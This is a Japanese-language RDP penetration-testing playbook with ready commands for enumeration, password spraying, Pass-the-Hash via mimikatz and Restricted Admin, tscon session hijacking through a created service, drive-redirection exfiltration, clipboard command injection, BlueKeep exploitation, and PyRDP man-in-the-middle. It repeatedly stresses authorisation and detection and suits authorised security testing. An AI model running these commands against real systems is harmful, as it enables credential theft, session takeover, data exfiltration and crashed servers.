# RDP

> **スコープ**: 3389 番ポート（または非標準 RDP ポート）の列挙〜接続取得・RDP 関連の取得後活動まで。バナー観察・暗号化レベル判定・NLA 有無判定・証明書監査・直接ログイン・リダイレクト悪用（クリップボード / ドライブ / プリンタ）・認証スプレー・Pass-the-Hash（Restricted Admin Mode）・セッションハイジャック（tscon）・既知 pre-auth RCE バージョン判定（BlueKeep / DejaBlue）・MitM までを 1 ファイルで扱う。接続後の Windows / AD 列挙・権限昇格・横展開は `../04_Post_Access_Windows_AD/Enumeration_Checklist.md` を参照。

## 着火条件

以下のいずれかに該当する場合:

- ポートスキャンで `3389/tcp open ms-wbt-server`（または非標準ポート上の RDP バナー）を検出
- 認証情報（パスワード / NTLM ハッシュ）が取得済みで認証試行を行う
- 製品出荷時のデフォルト認証情報を試行する許可がある
- 既存 AD アカウントで Pass-the-Hash 経路の成立性を検証する

## 環境前提

- 実行環境: テスター端末（Linux GUI または Windows）
- 必要なツール:
  - 観察: `nmap`（`rdp-enum-encryption` / `rdp-ntlm-info` スクリプト）/ `openssl s_client` / `rdp-sec-check.py`（プロトコル・暗号スイート・MitM 脆弱性の詳細レポート版、`pip` で取得・標準搭載なし）
  - 接続: `xfreerdp` / `xfreerdp3` / `rdesktop`（更新停止）/ `remmina`（GUI）/ Windows 標準 `mstsc.exe`
  - 認証突破: `nxc rdp`（NetExec の CLI ラッパー。RDP 認証確認・スプレーを一括で行う、ペネトレ用 Linux ディストリ標準搭載）/ `crowbar`（RDP 特化辞書攻撃）/ `hydra` / `ncrack`
  - MitM: `PyRDP`（`pip install pyrdp` で別途インストール、標準搭載なし）/ `Seth`（古い MITM ツール、CredSSP downgrade で平文 cred キャプチャ）
  - BlueKeep / DejaBlue 検査: Metasploit `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` / `nmap --script rdp-vuln-*`
- 外部リソース依存: PyRDP のインストールに `pip` 経由のインターネットアクセス要。それ以外のツールはペネトレ用 Linux ディストリ標準

## 先に確認すること

- **NLA（Network Level Authentication）の有無**（§2）: NLA 有効環境では接続前段で CredSSP 認証が完了するため、認証失敗で TCP セッションが即破棄される。BlueKeep / DejaBlue の事前認証 RCE も NLA で緩和される
- **AD ロックアウト設定**: `Account_Lockout_Recon.md` の AD 節（`nxc smb --pass-pol` でドメイン全体のロックアウト閾値取得）。RDP はドメインアカウントを使う場合、SMB / WinRM と **共通のロックアウトカウンタを直撃**
- **対象 OS バージョン**（§2 の `rdp-ntlm-info`）: Windows Server 2008 / Win7 等の古い OS は BlueKeep / DejaBlue 該当の可能性
- **試行ポート**: 標準 3389 だけでなく、`nmap -sV -p- --version-light` で 3390 / 33389 等の代替ポートも確認

**攻撃者の思考トレース:** RDP は認証情報がなければ入れない。Web / SMB / LDAP / FTP で先に認証情報を取得して「取れた cred を RDP で試す」スタンスが基本。NLA 有効環境では認証スプレーが ID 単位で AD ロックアウトを直撃するため、必ず `Account_Lockout_Recon.md` と組み合わせる。RDP ログイン成功は **GUI セッション取得 = ローカル端末からのファイル exfil 経路確立** でもあり、クリップボード / ドライブリダイレクトで横展開を加速できる。BlueKeep / DejaBlue は実 exploit 失敗時に BSOD（業務停止）が確実に発生するため、本番では版数判定までに限るのが定石。

---

## 1. バナー観察 / バージョン判定 / 暗号化レベル

**コマンド:**

```bash
# [Attacker] nmap rdp-enum-encryption スクリプト（セキュリティ層 + プロトコル列挙）
nmap -p 3389 --script rdp-enum-encryption [TARGET_IP]
# 出力例:
# 3389/tcp open  ms-wbt-server
# | rdp-enum-encryption:
# |   Security layer
# |     CredSSP (NLA): SUCCESS
# |     CredSSP with Early User Auth: SUCCESS
# |     Native RDP: SUCCESS
# |     SSL: SUCCESS

# [Attacker] サービスバージョン
nmap -sV -p 3389 [TARGET_IP]
# 3389/tcp open  ms-wbt-server  Microsoft Terminal Services
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `CredSSP (NLA): SUCCESS` のみ・他 `DISABLED` | NLA 強制環境 | 認証スプレー §6 は cred 既知時のみ。先に Account_Lockout_Recon |
| `CredSSP` + `Native RDP` 両方 `SUCCESS` | NLA は受理するが Native RDP も許容 | §2 の `rdp-ntlm-info` で pre-auth 情報漏洩を確認 |
| `Native RDP: SUCCESS` が単独（CredSSP / SSL なし）| RDP Standard Security 単独・古い構成 | §9 BlueKeep バージョン判定候補・§11 PyRDP MitM 経路候補 |
| `SSL: SUCCESS` のみ・`CredSSP: DISABLED` | TLS 経由 RDP だが NLA 無効 | §2 で NLA 有無を分離判定・古い OS の可能性 |
| `Microsoft Terminal Services` のみ表示・暗号化情報出ず | Windows XP / 2003 系の極めて古い実装 | §9 BlueKeep / 旧 MS12-020 候補。**極めて古い OS の単独露出は finding** |
| `rdp-enum-encryption` が timeout | 中間 FW で RDP layer がブロック / 非標準実装 | `rdp-ntlm-info` 単独で再試行 |

**注意:** 暗号化レベルが `Native RDP` 単独で許容される構成は CredSSP 未導入の古いハードニング不足で、Pass-the-Hash 攻撃と MitM の両方に脆弱。「`Native RDP` 単独許容 = ハードニング不足 finding」として記録できる。

---

## 2. NLA 有無判定 / Pre-Auth 情報漏洩

**コマンド:**

```bash
# [Attacker] NLA pre-auth で漏れる NetBIOS / DNS / OS バージョン取得
nmap -p 3389 --script rdp-ntlm-info [TARGET_IP]
# 出力例:
# | rdp-ntlm-info:
# |   Target_Name: EXAMPLE
# |   NetBIOS_Domain_Name: EXAMPLE
# |   NetBIOS_Computer_Name: [HOSTNAME]
# |   DNS_Domain_Name: example.local
# |   DNS_Computer_Name: [HOSTNAME].example.local
# |   DNS_Tree_Name: example.local
# |   Product_Version: 10.0.17763
# |   System_Time: 2026-05-26T...

# [Attacker] xfreerdp の応答から NLA 動作を観察（cred 不正で発火させる）
xfreerdp /v:[TARGET_IP] /u:[INVALID_USER] /p:[BOGUS_PASSWORD] /cert:ignore 2>&1 | head -30
# NLA 有効: "ERRCONNECT_LOGON_FAILURE" を接続初期段階で返す（ログオン bitmap 描画なし）
# NLA 無効: ログオン画面のビットマップが描画開始される
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Target_Name` / `DNS_Domain_Name` / `Product_Version` が返る | NLA 有効・**pre-auth で AD ドメイン名・OS バージョンが漏洩** | ドメイン名は AD 攻撃の起点。Product_Version → §9 / §10 該当判定 |
| `Product_Version: 6.0.6001`〜`6.0.6003` | Windows Vista / Server 2008 系 | §9 BlueKeep（CVE-2019-0708）強候補 |
| `Product_Version: 6.1.7600`〜`6.1.7601` | Windows 7 / Server 2008 R2 | §9 BlueKeep 候補 + §10 DejaBlue 候補 |
| `Product_Version: 10.0.x` | Windows 10 / Server 2016+ | build 番号と KB 適用で §10 DejaBlue 該当を判定 |
| NLA 無効（`xfreerdp` でログオン bitmap が描画）| 認証情報なしでログオン UI 到達可能 | スクリーン情報の偵察可・古い OS の可能性大 → §9 / §10 候補 |
| `rdp-ntlm-info` 無応答 + ログオン bitmap 描画 | NLA 自体に対応していない実装 | `xfreerdp` の挙動で代替判定 |

**注意:** `rdp-ntlm-info` は **認証試行を行わない pre-auth 情報漏洩** であり、ロックアウトカウンタを進めない。AD ドメイン名は LDAP / DNS でも取れるが、RDP からも取得可能な事実は「攻撃者が AD 識別に使える複数経路の 1 つ」として finding 化できる。NLA 有効化自体は CIS Benchmarks 等で推奨されるが、漏洩する情報は NLA を有効にしても残る点に注意。

---

## 3. RDP 証明書からの組織情報取得

**コマンド:**

```bash
# [Attacker] openssl で RDP の TLS 層証明書取得（SSL / CredSSP モード時）
openssl s_client -connect [TARGET_IP]:3389 -showcerts </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates
# Subject: CN = [HOSTNAME].example.local
# Issuer: CN = [HOSTNAME].example.local   ← 自己署名
# notBefore=... notAfter=...

# [Attacker] nmap ssl-cert スクリプト（同等情報を整形済みで）
nmap -p 3389 --script ssl-cert [TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Subject: CN = [HOSTNAME].example.local` | ホスト名 + ドメイン名取得 | `/etc/hosts` に `[TARGET_IP] [HOSTNAME].example.local [HOSTNAME]` を追記、AD 列挙へ |
| 自己署名（Subject = Issuer） | デフォルト設定・PKI 経由証明書未配布 | MitM 時に証明書警告が出るが「いつもの警告」として無視されやすい finding |
| Issuer に AD CS の CA 名 | エンタープライズ AD CS から発行 | `../04_Post_Access_Windows_AD/AD_CS/` の各 ESC を確認候補へ |
| notAfter が概ね 100 年先（`2037` 等） | Windows 既定の自己署名証明書 | 同上 |

**注意:** 証明書 CN は **NLA 有効環境でも認証前に取得可**。ホスト名・FQDN・AD CS Issuer 情報は他の認証なし列挙手段に並ぶ偵察ソース。CN が空 / IP のみの場合は古い RDP 実装の可能性が高い。

---

## 4. 認証情報での直接接続

**コマンド:**

```bash
# [Attacker] xfreerdp パスワード認証
xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASSWORD] /cert:ignore +clipboard

# [Attacker] xfreerdp ドメインアカウント
xfreerdp /v:[TARGET_IP] /d:[DOMAIN] /u:[USER] /p:[PASSWORD] /cert:ignore

# [Attacker] xfreerdp 非標準ポート
xfreerdp /v:[TARGET_IP]:[PORT] /u:[USER] /p:[PASSWORD] /cert:ignore

# [Attacker] xfreerdp 解像度指定 + 動作軽量化（低帯域環境向け）
xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASSWORD] /cert:ignore \
  /w:1280 /h:800 /bpp:16 /compression -themes -wallpaper

# [Attacker] Windows mstsc.exe（攻撃側 Windows から）
# mstsc /v:[TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| デスクトップ画面が描画される | ログイン成功 | §5 リダイレクト悪用 → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md` |
| `ERRCONNECT_LOGON_FAILURE` (0x20009) | cred 不正（NLA 有効環境） | 別 cred を試行・§6 スプレー検討（AD ロックアウト前提） |
| `ERRCONNECT_PRE_CONNECT_FAILED` | ホスト到達不能 / RDP 未起動 / FW で 3389 拒否 | `nmap` で開放確認 |
| 接続直後に切断・`SSL_read: Connection reset` | NLA 段階の CredSSP / NTLM ネゴ失敗 | `/sec:rdp` で Native RDP 強制を試す（古い OS のみ通る） |
| `ACCOUNT_DISABLED` / `ACCOUNT_LOCKED_OUT` | アカウント状態の問題 | LDAP / RPC で同 cred の状態確認・別 cred へ |
| `ACCOUNT_RESTRICTION` / `LOGON_TYPE_NOT_GRANTED` | "Allow log on through Remote Desktop Services" 権限なし | Remote Desktop Users / Administrators メンバー以外 → 別 cred / 別プロトコル（WinRM / SMB） |
| ログイン後すぐ強制切断 | サーバー側 disconnect / 同時セッション数上限 | §8 セッションハイジャックで既存セッション乗っ取り検討 |

**注意:** `/cert:ignore` は証明書警告無視で **MitM 検出を無効化** する副作用がある。自動化試行以外では使わない。`+clipboard` でクリップボードリダイレクト有効化（§5 で悪用）。GUI 接続中は **テスター端末側の操作が対象側に画面共有される可能性**（記録 / 監視されている前提で操作する）。

---

## 5. リダイレクト悪用（クリップボード / ドライブ / プリンタ）

**着火条件:** §4 で RDP ログインに成功している。リダイレクト機能が gpedit の「ターミナルサービス → デバイスとリソースのリダイレクト」で禁止されていない（既定では有効）。

**コマンド:**

```bash
# [Attacker] (A) クリップボード共有 + ローカルディレクトリを Z: ドライブとしてマウント
xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASSWORD] /cert:ignore \
  +clipboard \
  /drive:exfil,/home/[ATTACKER_USER]/exfil_dir

# [Target] RDP セッション内で Z: ドライブ経由でファイル exfil
# Windows Explorer で \\tsclient\exfil または Z:\ にコピー貼り付け
# powershell: Copy-Item C:\path\to\file.txt Z:\

# [Attacker] (B) プリンタリダイレクト（古典的データ exfil 経路）
xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASSWORD] /cert:ignore /printer:exfil_printer

# [Attacker] (C) USB デバイスリダイレクト
xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASSWORD] /cert:ignore /usb:auto

# [Attacker] (D) リダイレクトを全部無効化（ステルス）
xfreerdp /v:[TARGET_IP] /u:[USER] /p:[PASSWORD] /cert:ignore \
  -clipboard -drives -printers -usb
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| RDP セッション内で Z: ドライブが表示される | ドライブリダイレクト成立 | `Z:\` 経由で対象ファイルをテスター端末へ exfil（**事前合意必須**）|
| `\\tsclient\exfil` が UNC で見える | 同上 | Explorer / cmd / robocopy 経由でコピー可 |
| クリップボードに貼り付けたテキストが対象側で取得可 | クリップボード共有成立 | パスワード一時保管 / 大きいファイルパス転送等に利用 |
| Z: が出ない / `Access Denied` | グループポリシー `Do not allow drive redirection` が enabled | リダイレクト機能無効・ファイル exfil は別経路（SMB / Web upload / DNS exfil） |
| 接続後 explorer に該当マッピング無し | `Allow time zone redirection` 系のみ許可・ドライブは別 | gpedit 設定の限界確認 |

**クリップボード hijack（テスター側からの注入経路）:**

```bash
# [Attacker] xfreerdp 接続中はテスター側クリップボードが対象側にミラーされる
echo "[INJECTED_COMMAND]" | xclip -selection clipboard
# 対象側ユーザーが Ctrl+V で貼り付けた瞬間に攻撃側内容が混入
# 監視製品によっては clipboard sync イベント (TerminalServices-ClipboardRedirection) を記録
```

**注意:** リダイレクト機能経由のファイル exfil は **DLP / EDR の監視対象**（`tsclient` シグネチャ、Microsoft-Windows-TerminalServices-LocalSessionManager Event ID 21 / 24 / 25 / 41 等）。本番では対象組織との合意でファイル種別・量・時刻を明示する。クリップボード経由のテキスト exfil もログ取得対象。

---

## 6. 認証スプレー / 辞書攻撃

**事前準備（必須）:** `Account_Lockout_Recon.md` の AD 節で `nxc smb --pass-pol` / `impacket-samrdump` / `rpcclient getdompwinfo` を実行し、ロックアウト閾値・観察期間・FGPP（細粒度ポリシー）を取得する。RDP は AD ドメインアカウントの場合、SMB / WinRM と **共通のロックアウトカウンタを直撃**。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（管理者アカウントロックで業務継続不能）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM / EDR で確実に検知される（Event 4625 Type 10・Event 4771 / 4776 Source Workstation 記録）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] nxc rdp（NetExec・最も実用的）
nxc rdp [TARGET_IP] -u [USER] -p [PASSWORD]                                # 単発
nxc rdp [TARGET_IP] -u users.txt -p '[PASSWORD]' --continue-on-success    # ホスト固定スプレー
nxc rdp targets.txt -u [USER] -p '[PASSWORD]'                              # cred 使い回し検出（cred reuse）
nxc rdp [TARGET_IP] -u [USER] -H [NTLM_HASH]                               # NTLM PTH（§7 と連動）
nxc rdp [TARGET_IP] -u [USER] -p [PASSWORD] -d [DOMAIN] --nla-screenshot
# → NLA 無効環境では接続後ログオン画面をキャプチャ保存

# [Attacker] crowbar（RDP 特化・hydra より RDP 認証で安定）
crowbar -b rdp -s [TARGET_IP]/32 -u [USER] -C passwords.txt

# [Attacker] hydra rdp module
hydra -t 1 -V -l [USER] -P passwords.txt rdp://[TARGET_IP]
hydra -t 1 -V -L users.txt -p '[PASSWORD]' rdp://[TARGET_IP]      # スプレー

# [Attacker] ncrack
ncrack -p 3389 --user [USER] -P passwords.txt [TARGET_IP] -T2
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `nxc rdp` で `[+] [DOMAIN]\[USER]:[PASSWORD]` | 認証成功 | §4 で直接ログインへ |
| `nxc rdp targets.txt` で複数ホストヒット（同一ローカル cred） | **cred 使い回し（cred reuse）検出** | **LAPS 未導入の重大 finding**・横展開連鎖の起点 |
| `STATUS_LOGON_FAILURE` | cred 不一致 | 別 cred を試行 |
| `STATUS_ACCOUNT_LOCKED_OUT` | アカウントロック発生 | **即試行停止**・Account_Lockout_Recon 再確認・解除待機 |
| `STATUS_PASSWORD_EXPIRED` | パスワード期限切れだが cred 自体は有効 | LDAP 経由で同 cred 状態確認・パスワード変更は事前合意必須 |
| crowbar / hydra が timeout 多発 | per-IP throttle（fail2ban / IDS） | `-t 1` 並列 1 にする・nxc に切替 |
| 全 cred が `STATUS_LOGON_TYPE_NOT_GRANTED` | RDP ログオン権限がそもそも無い | "Remote Desktop Users" メンバ確認・別経路（WinRM / SMB） |

**注意:** RDP スプレーは **Event 4625 (Logon Failure) Type 10 (RemoteInteractive)** が確実に記録される。Workstation 名 / Source IP も併記されるため、Source IP 偽装は不可。AD では `4771` (Kerberos pre-auth failed) / `4776` (NTLM Authentication) も並行記録。**cred 使い回し（cred reuse）検出は「同じローカル管理者パスワードが複数ホストで通る」が代表シナリオ**で、LAPS 未導入の重大な findings となる（`Impacket_Exec.md` §8 の `--local-auth` と同思想）。

---

## 7. Pass-the-Hash for RDP（Restricted Admin Mode）

**着火条件:** NTLM ハッシュ取得済み（`../04_Post_Access_Windows_AD/Credential_Dumping.md` / SAM dump / DCSync 経由）。ターゲット側で **Restricted Admin Mode が有効**（`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` が `0` または未設定）。Server 2012 R2 / Win 8.1+ で利用可。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [ ] 業務停止リスク
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（攻撃側でレジストリ `DisableRestrictedAdmin` 書込を行う場合は対象側の設定変更）
> - [x] SIEM / EDR で確実に検知される（Event 4624 Logon Type 10 + NTLM authentication source / Restricted Admin 有効化の Registry 書込）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] xfreerdp Restricted Admin + NTLM ハッシュ
xfreerdp /v:[TARGET_IP] /u:[USER] /pth:[NTLM_HASH] /cert:ignore /restricted-admin

# [Attacker] xfreerdp Restricted Admin + Kerberos チケット（PtT）
export KRB5CCNAME=/tmp/[USER].ccache
xfreerdp /v:[TARGET_IP] /u:[USER] /d:[DOMAIN] /cert:ignore /restricted-admin

# [Attacker] Windows mstsc.exe Restricted Admin（mimikatz sekurlsa::pth でハッシュ注入したコンテキストから mstsc 起動）
# mimikatz # privilege::debug
# mimikatz # sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[NTLM_HASH] /run:"mstsc.exe /restrictedadmin /v:[TARGET_IP]"
# → 新しい mstsc プロセスが指定ハッシュで認証を行う
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| デスクトップ描画成功 | Restricted Admin 有効・PTH 成立 | §4 / §5 と同じ操作可 |
| `Account Restrictions are preventing this user from signing in` | Restricted Admin 無効環境 | レジストリ `DisableRestrictedAdmin=0` への変更は **侵入後にのみ可能** → 別経路（WinRM / Impacket_Exec）でハッシュ持ち込み |
| `ERRCONNECT_LOGON_FAILURE` | hash 不一致 / Restricted Admin 無効 | hash 再取得 / 別経路 |
| ログイン後すぐ切断 | Restricted Admin セッションの制限機能（`NT AUTHORITY\NETWORK` 相当ログオン） | ネットワーク経由の権限のみ・ローカルリソースアクセス不可・PtT で別ホストへ連鎖 |

**注意:** Restricted Admin Mode は **PTH 防御目的の機能だが、副作用として PTH を可能にする** 矛盾を抱える。ログオンセッションは `NETWORK` タイプのため、Kerberos / NTLM 認証情報の **二次利用は制限される**（Pass-the-Ticket 経由の更なる連鎖は通常通り可能）。

---

## 8. RDP セッションハイジャック（tscon）

**着火条件:** ターゲットホストに既に SYSTEM 権限取得済み（`../04_Post_Access_Windows_AD/Enumeration_Checklist.md` の SeImpersonate / SeDebug 系経路）。**別ユーザー（特に管理者）の RDP セッションが disconnected または active 状態で残っている**。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（対象ユーザーの作業中セッションが奪取される）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（**ハイジャックされたユーザーは強制切断され、原状回復不可**）
> - [x] SIEM / EDR で確実に検知される（Event 4778 / 4779 Session connect / reconnect・Microsoft-Windows-TerminalServices-LocalSessionManager Event 21 / 24・サービス作成経路では Event 7045）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```powershell
# [Target] 現在の RDP セッション列挙（ローカル）
query user
# USERNAME       SESSIONNAME  ID  STATE      IDLE TIME   LOGON TIME
# [ADMIN_USER]   rdp-tcp#0    1   Active     .           5/26/2026 10:00
# [TARGET_USER]  rdp-tcp#2    2   Disc       12:34       5/26/2026 11:00

# [Attacker] リモートセッション列挙（別ホストから・要 cred）
qwinsta /server:[TARGET_IP]                # qwinsta = quser のエイリアス
query user /server:[TARGET_IP]
quser /server:[TARGET_IP]
# → ADMIN$ / IPC$ 経由の RPC 呼び出し。ADMIN$ アクセス権が必要

# [Target] SYSTEM 権限で tscon により別セッションへハイジャック
# 通常ユーザー権限ではパスワードが必要だが、SYSTEM 経由は無認証で接続可

# (A) PsExec で SYSTEM シェル取得 → tscon
PsExec.exe -s -i cmd.exe
tscon 2 /dest:rdp-tcp#1
# → セッション ID 2 (Disc) を自分の rdp-tcp#1 へ接続

# (B) サービス経由（事前合意なしでも実施可能な手段、テスト識別子マーカー付き）
sc.exe create kedalab-[CASE_ID]-hijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1"
sc.exe start kedalab-[CASE_ID]-hijack
# 終了後（原状回復）: sc.exe delete kedalab-[CASE_ID]-hijack
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 自分の RDP 画面が突如別ユーザーのデスクトップに切替 | ハイジャック成立 | 対象ユーザー権限で操作可・**画面遷移を対象ユーザーが認識**する可能性に注意 |
| `tscon` で `Error 5: Access is denied` | 通常ユーザー権限で実行している | SYSTEM 権限取得（`PsExec -s` / `sc.exe create`）が必要 |
| `query user` で他セッションが `Disc`（disconnected）状態 | RDP 切断（× / ログオフではない）後のセッション残存 | ハイジャック最良の標的（対象ユーザーは即座には気付かない） |
| `query user` で他セッションが `Active` | 対象ユーザーが操作中 | ハイジャックすると即座に対象側画面がブラックアウト・**強い検知シグナル** + 業務停止リスク |

**注意:** `tscon /dest:rdp-tcp#N` は **SYSTEM 権限なら無認証で他ユーザーセッションへ接続可** という Windows の長年の挙動。Microsoft はこれを「セッション管理者の意図的設計」と回答している。検知は Event 4778 / 4779 で `Account Name` と `Session Name` の組合せから容易。**ハイジャックされたユーザーは強制切断される**ため Active セッションへの実施は業務停止リスク大。原状回復は不可（セッション奪取の痕跡は残る）→ 事前合意で対象セッション・実施時刻を明示記録すること。

---

## 9. BlueKeep バージョン判定（CVE-2019-0708）

**着火条件:** §2 の `rdp-ntlm-info` で `Product_Version` が以下に該当する OS:

- `5.1.2600` (Windows XP)
- `5.2.3790` (Windows Server 2003)
- `6.0.6001`〜`6.0.6003` (Windows Vista / Server 2008)
- `6.1.7600`〜`6.1.7601` (Windows 7 / Server 2008 R2)

Windows 8 / Server 2012 以降は影響外。NLA 有効化で緩和可能（Microsoft が公表した緩和策）。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク必至（exploit 失敗時 BSOD が確実）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（攻撃成立時はカーネル空間でのコード実行）
> - [x] SIEM / EDR で確実に検知される（特異な RDP packet パターン・Wireshark で識別可）
>
> **バージョン判定までは技術的判断で実施可・実 exploit は事前合意必須**。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] バージョン判定（侵入なし、ロックアウトも進めない）
nmap -p 3389 --script rdp-ntlm-info [TARGET_IP] | grep -E "Product_Version|System_Time"

# [Attacker] 旧 MS12-020 (CVE-2012-0002) もあわせてチェック（Server 2003〜2008 の DoS 専用・RCE ではない）
nmap -p 3389 --script rdp-vuln-ms12-020 [TARGET_IP]

# [Attacker] Metasploit BlueKeep スキャナ（判定のみ・実 exploit はしない）
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; \
  set RHOSTS [TARGET_IP]; run; exit"
# 出力: The target is vulnerable. / The target is not exploitable. / The target is patched.

# [Attacker] 実 exploit（事前合意済み演習環境のみ）
# msf > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
# msf > set RHOSTS [TARGET_IP]; set target [N]; check
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `The target is vulnerable.` | パッチ未適用 | バージョン finding 化（実 exploit は事前合意必須） |
| `The target is patched.` / `not exploitable.` | パッチ済み or NLA で防御 | 別経路 |
| `Product_Version: 6.1.7601` + KB4499175 / KB4499180 未確認 | 該当バージョン疑い | KB 適用状況の確認は侵入後のみ可（`wmic qfe list` 等） |
| §1 で NLA 強制環境 | BlueKeep 緩和済み | NLA 経由の認証突破 / 別 CVE 候補へ |

**注意:** BlueKeep の実 exploit は **target ID の選択を誤ると BSOD（OS クラッシュ）が高確率で発生**。Metasploit モジュールの target 種別を Win 7 / Server 2008 R2 のビルド・ハードウェアと厳密に合わせる必要がある。**ターゲット種別 mismatch = BSOD**。NLA 有効環境では pre-auth でブロックされるため exploit 無効（Microsoft が NLA 有効化を緩和策として推奨した経緯）。

---

## 10. DejaBlue バージョン判定（CVE-2019-1181 / 1182 / 1222 / 1226）

**着火条件:** §2 の `Product_Version` が以下に該当し、対応 KB が未適用:

- Windows 7 SP1 / Server 2008 R2 SP1（2019-08 月例 KB 未適用）
- Windows 8.1 / Server 2012 R2
- Windows 10 各 build（1607 / 1703 / 1709 / 1803 / 1809 / 1903）

> **[HIGH IMPACT]** 本攻撃は BlueKeep と同じく:
> - [x] 業務停止リスク（exploit 失敗時 BSOD）
> - [x] 公開された安定 PoC は限定的（**PoC コードに backdoor 混入リスクあり**・PoC 選定要注意）
> - [ ] 持続化に該当
> - [x] SIEM / EDR で確実に検知される
>
> **バージョン該当判定まで実施可・実 exploit は事前合意必須**。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] バージョン判定（KB は侵入後のみ確認可能）
nmap -p 3389 --script rdp-ntlm-info [TARGET_IP]
# Product_Version で OS build を特定し、CVE-2019-1181 / 1182 / 1222 / 1226 の影響範囲と照合

# [Attacker] 安定 PoC は BlueKeep ほど整備されていないため、検索の起点を確認
searchsploit dejablue
searchsploit CVE-2019-1181
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Product_Version` で該当 build | 2019-08 月例 KB 未適用の可能性 | finding 化・実 exploit は信頼可能 PoC（Rapid7 / Bishop Fox / Mandiant 由来）の入手後のみ |
| PoC が個人 GitHub リポにしかない | **バックドア混入リスク高** | コード読解せずに実行しない・本番では使わない |
| NLA 強制 + 該当 build | NLA で pre-auth がブロックされる CVE-2019-1181 / 1182 は緩和可 | post-auth 系 CVE のみ残る・別経路 |

**注意:** DejaBlue は複数 CVE の総称で、CVE-2019-1181 / 1182 が pre-auth、CVE-2019-1222 / 1226 が pre-auth / post-auth 混在。**公開された安定 PoC は BlueKeep ほど整備されていない**ため、本番では版数判定 + 緩和策確認に留めるのが現実的。

> **スコープ補足（RD Gateway CVE との混同回避）:** RD Gateway 系 CVE（CVE-2020-0609 / CVE-2020-0610 / BlueGate）は **port 443 / 3391 の Remote Desktop Gateway** が対象で、本ファイルが扱う **port 3389 の Remote Desktop Services (RDS)** とは別コンポーネント。RDS Gateway 製品が露出している場合は別途検査軸が必要。チートシート類で 1181 / 1182 と 0609 / 0610 が同じ表で扱われていることがあるが、攻撃対象ポートが異なる点に注意。

---

## 11. RDP MitM（PyRDP）

**着火条件:** 攻撃側が **被害者と RDP サーバーの間に経路を持てる**（ARP spoofing / DNS poisoning / DHCP 操作 / 評価環境のスイッチミラー等）。NLA 無効、または NLA downgrade 可能な構成。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（被害者の RDP 接続が攻撃者経路に向けられ、操作が中継・記録される）
> - [x] 不可逆な情報取得（被害者のパスワード・全画面操作・送受信ファイルが記録される）
> - [ ] 持続化に該当
> - [x] SIEM / EDR で確実に検知される（RDP 証明書変化 / 経路変化 / ARP 異常）
>
> **MitM は対象組織との詳細合意が必須**（被害者の同意・記録範囲・データ取扱）。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] PyRDP の MitM 起動（被害者からの接続を中継）
pip install pyrdp                              # 別途インストール、標準搭載なし
pyrdp-mitm [REAL_RDP_SERVER_IP]
# default で 3389 listen、被害者を攻撃側 IP に誘導する経路は別途構築（ARP spoof 等）

# [Attacker] 録画再生
# pyrdp-mitm は recording/ ディレクトリに .pyrdp / .replay を出力
pyrdp-player [REPLAY_FILE]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Connection from [VICTIM_IP] forwarded to [REAL_RDP_SERVER_IP]` | MitM 経路成立 | 被害者の操作録画・credential capture |
| クライアントが証明書警告を拒否して接続中断 | 自己署名証明書のテンプレ差異検知 | 攻撃側で同 CN の証明書を再生成・依然警告は出る |
| NLA 強制で MitM が失敗 | CredSSP / NLA で MitM 不可（設計通り） | NLA 無効化 downgrade 経路（GPO 設定誤り環境）のみ可 |

